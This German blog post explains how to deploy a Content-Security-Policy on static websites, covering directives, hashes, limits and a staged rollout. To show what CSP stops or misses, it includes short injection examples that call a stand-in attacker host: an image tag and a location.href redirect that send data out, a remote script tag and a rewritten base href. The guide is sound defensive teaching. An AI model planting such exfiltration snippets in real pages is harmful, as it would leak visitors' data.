---
title: "Content-Security-Policy für statische Seiten"
description: "Was eine Content-Security-Policy auf einer statischen Seite verhindert, was nicht, und wie man sie einführt. Das Browserverhalten ist per Testskript geprüft."
date: 2026-11-06
category: tech
tags: [csp, websicherheit, http-header, xss]
draft: false
status: draft-review
---

Eine statische Seite hat keinen Servercode, keine Datenbank und kein Login.
Das schließt viele Angriffe aus, aber nicht den wichtigsten im Browser: das
Einschleusen von Skript, kurz XSS. Auch eine statische Seite rendert Inhalte,
die nicht vollständig unter ihrer Kontrolle stehen. Markdown erlaubt rohes
HTML. Ein Plugin des Seitengenerators bettet ein fremdes Widget ein. Eine
Abhängigkeit im Build wird kompromittiert. Clientseitiges JavaScript liest
einen Wert aus der URL und schreibt ihn in die Seite.

Eine Content-Security-Policy (CSP) setzt danach an. Sie verhindert nicht, dass
fremdes Markup in die Seite gelangt. Sie legt fest, was der Browser mit einer
Seite tun darf: welche Skripte er ausführt, von wo er Bilder, Schriften und
Stylesheets lädt, wohin Formulare senden dürfen und wer die Seite einbetten
darf. Steht das eingeschleuste Skript nicht auf dieser Liste, läuft es nicht.

Für statische Seiten ist CSP besonders gut geeignet, weil sich ihr Inhalt
beim Build vollständig überblicken lässt. Gleichzeitig wird sie oft
überschätzt. Die Aussagen über das Browserverhalten in diesem Beitrag sind
mit einem Skript in Chromium nachgeprüft (Quellen am Ende), und sie entsprechen
dem, was die Spezifikation CSP Level 3 vorschreibt.

## Wie eine Policy aufgebaut ist

Die Policy ist ein HTTP-Antwortheader. Er besteht aus Direktiven, getrennt
durch Semikolons, und jede Direktive nennt die erlaubten Quellen. Eine
strenge Policy für eine Seite, die alles von der eigenen Domain lädt, sieht
so aus (hier zur Lesbarkeit umbrochen, im Header steht sie in einer Zeile):

```http
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self';
  img-src 'self'; font-src 'self'; connect-src 'self'; object-src 'none';
  base-uri 'none'; form-action 'self'; frame-ancestors 'none'
```

`'self'` bedeutet: dieselbe Herkunft (Schema, Host und Port) wie die Seite.
`'none'` verbietet die Ressource ganz. Daneben gibt es Hostnamen
(`https://cdn.example`), Hashes und Nonces (dazu gleich) sowie Schlüsselwörter
wie `'unsafe-inline'` und `'unsafe-eval'`, die Schutz wieder abschalten.

`default-src` ist der Rückfallwert, aber nur für die sogenannten
Fetch-Direktiven: `script-src`, `style-src`, `img-src`, `font-src`,
`connect-src` und einige weitere. Für `base-uri`, `form-action` und
`frame-ancestors` gilt er nicht. Steht dort nichts, ist dort nichts
eingeschränkt. Das ist der Grund, warum die Beispiel-Policy sie ausdrücklich
nennt.

## Was sie verhindert

**Inline-Skripte und Event-Handler.** Mit `script-src 'self'` laufen nur
Skripte aus Dateien der eigenen Domain. Ein eingeschleustes
`<script>…</script>` läuft nicht, ebenso wenig ein Attribut wie
`onerror="…"` an einem Bild oder ein Link mit `javascript:`. Der Browser
meldet die Verstöße getrennt als `script-src-elem` (Element) und
`script-src-attr` (Attribut). Das ist der Hauptnutzen: Die häufigste Form von
XSS braucht genau solche Inline-Konstrukte.

**`eval` und Verwandte.** Ohne `'unsafe-eval'` sind `eval()`,
`new Function()` und Zeichenketten als Argument von `setTimeout` gesperrt.

**Skripte von fremden Servern.** Ein `<script src="https://angreifer.example/x.js">`
wird nicht geladen, wenn diese Herkunft nicht in `script-src` steht.

**Inline-Styles.** `style-src 'self'` sperrt `<style>`-Elemente und
`style="…"`-Attribute. Das klingt nach einer Stilfrage, ist aber Schutz:
Mit eingeschleustem CSS lassen sich Seiten überdecken und in bestimmten
Fällen Attributwerte auslesen.

**Daten abfließen lassen über Bilder.** Ein eingeschleustes
`<img src="https://angreifer.example/?daten=…">` braucht kein Skript, um
etwas zu senden. Mit `img-src 'self'` stellt der Browser diese Anfrage nicht.
Im Experiment ging sie ohne `img-src` und ohne `default-src` hinaus, mit
`img-src 'self'` nicht.

**Einbetten in fremde Seiten.** `frame-ancestors 'none'` verbietet anderen
Seiten, die eigene in einem Frame zu laden, und verhindert damit Clickjacking.
Es übernimmt die Aufgabe des älteren Headers `X-Frame-Options`.

**Ein umgebogenes `<base>`.** Ein eingeschleustes `<base href="https://angreifer.example/">`
ändert, wohin alle relativen URLs der Seite zeigen. `base-uri 'none'`
verhindert das. Im Experiment mit `default-src 'self'` allein wurde die
Basis-URL tatsächlich umgebogen. Die relativ eingebundenen Bilder blockierte
dann zwar `default-src`, aber ein Link oder Formular mit relativem Ziel hätte
auf die fremde Domain gezeigt.

## Hashes und Nonces

Manchmal braucht eine Seite ein kleines Inline-Skript, etwa um vor dem ersten
Zeichnen das Farbschema zu setzen. Dafür gibt es zwei Ausnahmen, die nur
dieses eine Skript erlauben.

Eine **Nonce** ist ein Zufallswert, der im Header steht
(`script-src 'nonce-…'`) und am `<script>`-Element wiederholt wird. Sie
schützt nur, wenn sie für jede Antwort neu erzeugt wird, sonst kann ein
Angreifer sie einfach mitschicken. Eine rein statische Auslieferung, bei der
der Server dieselbe Datei an alle schickt, kann das nicht leisten.

Ein **Hash** passt dagegen genau zu statischen Seiten. Man berechnet den
SHA-256-Hash des Skriptinhalts, Byte für Byte, und nimmt ihn in die Policy
auf:

```sh
node -e '
  const { createHash } = require("crypto");
  const hash = createHash("sha256").update(process.argv[1]);
  console.log("sha256-" + hash.digest("base64"));
' 'document.documentElement.classList.add("js");'
# sha256-WZRJfWvsnNCPcxzZwvyhovnZGqhZaC+8gPGPRbx6wTk=
```

```http
Content-Security-Policy: script-src 'self'
  'sha256-WZRJfWvsnNCPcxzZwvyhovnZGqhZaC+8gPGPRbx6wTk='
```

Mit dieser Policy läuft genau das Skript
`document.documentElement.classList.add("js");`. Ein einziges zusätzliches
Leerzeichen ergibt einen anderen Hash, und das Skript wird blockiert. Das ist
gewollt, macht Hashes aber empfindlich: Jeder Build-Schritt, der Inline-Code
umformatiert oder minifiziert, ändert den Hash.

Hashes gelten nur für `<script>`-Elemente. Ein Event-Handler wie
`onclick="…"` lässt sich selbst dann nicht per Hash erlauben, wenn sein Hash
in der Policy steht, außer mit dem zusätzlichen Schlüsselwort
`'unsafe-hashes'`. Der Name ist eine Warnung: Ein erlaubter Handler-Code kann
an jedes Element gehängt werden. Besser ist es, Handler mit
`addEventListener` in einer Skriptdatei zu registrieren.

Für statische Seiten ist die einfachste Lösung, gar kein Inline-Skript zu
haben. Ein Skript, das im `<head>` als Datei geladen wird, läuft ebenfalls
vor dem ersten Zeichnen, kostet nur eine kleine zusätzliche Anfrage und
braucht keinen Hash.

## Was sie nicht verhindert

**Skripte von erlaubten Quellen.** Eine Policy ist nur so streng wie ihre
schwächste erlaubte Quelle. Steht dort ein großes CDN, darf jedes Skript
geladen werden, das auf diesem CDN liegt, auch ein altes Framework oder ein
JSONP-Endpunkt, mit dem ein Angreifer eigenen Code ausführen kann.
Weichselbaum, Spagnuolo, Lekies und Janc haben 2016 die Policies von
1 680 867 Hosts untersucht. In 94,72 % der 26 011 verschiedenen Policies
fanden sie Umgehungen. 14 der 15 am häufigsten für Skripte erlaubten Domains
enthielten unsichere Endpunkte. Ihr Vorschlag, auf Hostlisten zu verzichten
und Skripte über Nonces oder Hashes zu erlauben, ist in die Spezifikation
eingeflossen (`'strict-dynamic'`).

**Kompromittierter eigener Code.** `'self'` vertraut allem, was auf der
eigenen Domain liegt. Bringt eine Abhängigkeit im Build schädlichen Code in
das ausgelieferte JavaScript, läuft er mit vollen Rechten. CSP schützt vor
eingeschleustem Markup, nicht vor einer vergifteten Lieferkette.

**Navigation.** CSP schränkt nicht ein, wohin die Seite selbst navigiert. Ein
erlaubtes Skript kann `location.href = "https://angreifer.example/?d=…"`
setzen, und die Daten sind weg. Im Experiment kam der Seitentitel trotz
`default-src 'self'` bei der fremden Domain an. CSP Level 3 enthält keine
Direktive, die das verhindert. Auch ein eingeschleuster Link, den jemand
anklickt, ist nicht blockiert.

**Markup ohne Skript.** Eine eingeschleuste gefälschte Meldung, ein
Phishing-Formular oder ein irreführender Link bleiben möglich. `form-action`
begrenzt, wohin Formulare senden, und `img-src` die Kanäle für
Datenabfluss, aber Inhalte selbst prüft CSP nicht.

**Fehler, die vor dem Browser liegen.** CSP ersetzt weder sauberes Escaping
beim Erzeugen der Seite noch TLS, sichere Abhängigkeiten oder einen gut
konfigurierten Server. Sie ist die zweite Verteidigungslinie für den Fall,
dass die erste versagt.

## Fremde Quellen kosten doppelt

Jede Herkunft, die in der Policy steht, ist eine Ausnahme mit zwei Folgen.
Die erste ist die oben beschriebene: Sie erweitert, was im Fall einer
Injektion ausgeführt oder geladen werden darf. Die zweite betrifft die
Besucher. Lädt die Seite eine Schrift, ein Skript oder ein Bild von einem
fremden Server, schickt der Browser bei jedem Aufruf eine Anfrage dorthin,
mit der IP-Adresse des Besuchers, der aufgerufenen Seite im
`Referer`-Header, soweit die Referrer-Policy das zulässt, und gegebenenfalls
Cookies dieser Domain.

Für eine statische Seite ist die Konsequenz meist einfach: Schriften, Skripte
und Bilder selbst ausliefern. Dann reicht überall `'self'`, die Policy wird
kürzer, und es gibt keine Anfragen an Dritte, über die man in einer
Datenschutzerklärung Auskunft geben müsste. Wo sich eine fremde Quelle nicht
vermeiden lässt, gehört sie in genau die eine Direktive, die sie braucht,
etwa nur `img-src`, und nicht in `default-src`.

Ob die Policy beim Besucher ankommt, zeigt ein Blick auf die Antwortheader,
zum Beispiel mit `curl -sI https://example.org/` oder in den Entwicklerwerkzeugen
des Browsers unter „Netzwerk“. Dort sieht man auch, ob ein Zwischenhändler wie
ein CDN den Header verändert oder doppelt setzt. Sind mehrere Policies
vorhanden, gelten alle gleichzeitig: Eine Ressource muss jede von ihnen
erfüllen. Eine zweite Policy kann also nur weiter einschränken, nie lockern.

## Wo die Intuition täuscht

**„`default-src 'self'` deckt alles ab.“** Es deckt die Fetch-Direktiven ab.
`base-uri`, `form-action` und `frame-ancestors` bleiben offen, wenn man sie
nicht nennt. Für `frame-ancestors` sagt die Spezifikation das ausdrücklich,
für `base-uri` zeigt es das Experiment oben.

**„Die Policy im `<meta>`-Tag ist gleichwertig.“** Eine Policy lässt sich
auch per `<meta http-equiv="Content-Security-Policy">` setzen, was bei
Hostern ohne eigene Header verlockend ist. Die Spezifikation schließt dort
aber `frame-ancestors`, `report-uri` und `sandbox` aus, und der Report-Only-Modus
existiert nur als Header. Außerdem gilt die Meta-Policy erst ab der Stelle,
an der sie im Dokument steht. Chromium ignoriert `frame-ancestors` im
`<meta>`-Tag und schreibt eine Warnung in die Konsole.

**„Report-Only ist ein guter Dauerzustand.“** Der Header
`Content-Security-Policy-Report-Only` meldet Verstöße, blockiert aber nichts.
Im Experiment lief das eingeschleuste Skript, und der Browser meldete den
Verstoß mit dem Vermerk `report`. Das ist für die Einführung gedacht, nicht
als Schutz.

**„Eine Policy, die alles erlaubt, was die Seite braucht, ist streng.“**
`'unsafe-inline'` in `script-src` erlaubt genau das, wogegen CSP hauptsächlich
schützen soll. Eine Policy mit diesem Wort ist für XSS weitgehend wirkungslos,
egal wie lang der Rest ist.

## Schrittweise einführen

Eine Policy auf einer bestehenden Seite einfach scharf zu schalten, bricht
fast immer etwas. Bewährt hat sich eine Reihenfolge, bei der man zu jedem
Zeitpunkt weiß, was passiert.

**1. Bestand aufnehmen.** Was lädt die Seite von wo? Für eine statische Seite
lässt sich das vollständig aus dem Build-Ergebnis ablesen: alle
`<script>`-Elemente mit und ohne `src`, alle `style`-Attribute und
`<style>`-Elemente, alle `on…=`-Attribute, alle externen URLs in `src` und
`href`. Werkzeuge erzeugen solche Konstrukte oft stillschweigend. Der
Syntax-Highlighter Shiki etwa färbt Code standardmäßig über
`style="color:…"`-Attribute, und die HTML-Ausgabe von KaTeX positioniert
Formeln mit Inline-Styles.

**2. Report-Only mit der Zielpolicy.** Die strenge Policy wird zuerst als
`Content-Security-Policy-Report-Only` ausgeliefert. Die Seite funktioniert
weiter, und die Konsole des Browsers zeigt jeden Verstoß mit Direktive und
Fundstelle. Berichte an einen Server (`report-uri`, `report-to`) brauchen
einen Endpunkt, der sie annimmt. Für eine statische Seite ohne Backend ist
es einfacher, die Seiten automatisiert in einem Headless-Browser aufzurufen
und dort die `securitypolicyviolation`-Ereignisse einzusammeln, wie es das
Prüfskript dieses Beitrags tut.

**3. Inline-Code entfernen.** Skripte in Dateien verschieben, Event-Handler
durch `addEventListener` ersetzen, `style`-Attribute durch Klassen,
Konfiguration der Werkzeuge so ändern, dass sie Klassen statt Styles
erzeugen. Was danach noch inline bleiben muss, bekommt einen Hash.

**4. Scharf schalten.** Erst wenn im Report-Only-Modus keine Verstöße mehr
auftreten, wird der Header zu `Content-Security-Policy`. Beide Header dürfen
gleichzeitig existieren. So lässt sich eine noch strengere nächste Fassung
parallel als Report-Only testen, während die aktuelle schützt.

**5. Im Build absichern.** Der Zustand hält nur, wenn ihn ein automatischer
Test bewacht. Nach jedem Build durchsucht ein Skript das erzeugte HTML nach
Inline-Skripten, `style`- und `on…`-Attributen und fremden Quellen und lässt
den Build scheitern, wenn es etwas findet. Das kostet wenige Zeilen und fängt
genau die Fälle, in denen ein Update oder ein neues Plugin unbemerkt wieder
Inline-Code einführt.

## Quellen und Prüfskript

- W3C: [Content Security Policy Level 3](https://www.w3.org/TR/CSP3/),
  Working Draft. Abschnitt 3.3 (Einschränkungen per `<meta>`), 6.4.2
  (`frame-ancestors` ohne Rückfall auf `default-src`), 8.3 (`'unsafe-hashes'`).
- MDN: [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP)
  und [default-src](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/default-src),
  mit der Liste der Direktiven, für die `default-src` als Rückfall gilt.
- Lukas Weichselbaum, Michele Spagnuolo, Sebastian Lekies, Artur Janc:
  [CSP Is Dead, Long Live CSP! On the Insecurity of Whitelists and the Future of Content Security Policy](https://research.google/pubs/pub45542/),
  ACM CCS 2016.
- OWASP: [Content Security Policy Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html).
- Shiki: [Dual Themes](https://shiki.style/guide/dual-themes), mit einem
  Beispiel der Ausgabe als `style`-Attribute.
- Das Prüfskript `tests/articles/csp_experiments.mjs` im
  [Repository dieser Seite](https://github.com/timur-manjosov/portfolio)
  ruft für jede Aussage oben eine Testseite in Chromium auf (Playwright, alle
  Anfragen lokal abgefangen) und prüft, ob der Browser sich wie beschrieben
  verhält. Andere Browser wurden nicht automatisiert geprüft. Die genannten
  Regeln stammen aber aus der Spezifikation, nicht aus einer Eigenheit von
  Chromium.
